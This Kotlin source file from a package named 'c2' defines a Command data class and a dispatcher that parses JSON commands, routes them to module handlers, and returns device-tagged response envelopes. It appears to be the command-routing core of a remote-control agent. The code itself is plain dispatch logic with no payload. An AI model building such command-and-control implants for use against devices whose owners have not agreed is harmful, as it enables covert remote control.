package org.umbra.core.c2

import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import org.umbra.core.core.ResponseEnvelope
import org.umbra.core.core.UmbraResponse

@Serializable
data class Command(
    @SerialName("command_id")
    val cmd_id: String = "",
    val module: String = "",
    val action: String = "",
    val params: Map<String, String> = emptyMap()
)

object CommandDispatcher {

    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }

    private var handlers: Map<String, suspend (Command) -> UmbraResponse> = emptyMap()
    private var deviceId: String = ""

    fun register(moduleHandlers: Map<String, suspend (Command) -> UmbraResponse>) {
        handlers = moduleHandlers
    }

    fun setDeviceId(id: String) {
        deviceId = id
    }

    suspend fun dispatch(raw: String): String {
        return try {
            val cmd = json.decodeFromString<Command>(raw)
            val handler = handlers[cmd.module]
            val response = if (handler != null) {
                handler(cmd)
            } else {
                UmbraResponse.ErrorResponse(error = "unknown_module:${cmd.module}", module = cmd.module)
            }

            val envelope = ResponseEnvelope(
                type = response::class.simpleName ?: "Unknown",
                device_id = deviceId,
                cmd_id = cmd.cmd_id,
                status = if (response is UmbraResponse.ErrorResponse) "error" else "ok",
                payload = response,
                error = if (response is UmbraResponse.ErrorResponse) response.error else ""
            )

            json.encodeToString(ResponseEnvelope.serializer(), envelope)
        } catch (e: Exception) {
            val envelope = ResponseEnvelope(
                type = "parse_error",
                device_id = deviceId,
                cmd_id = "?",
                status = "error",
                error = "parse:${e.message}"
            )
            json.encodeToString(ResponseEnvelope.serializer(), envelope)
        }
    }
}
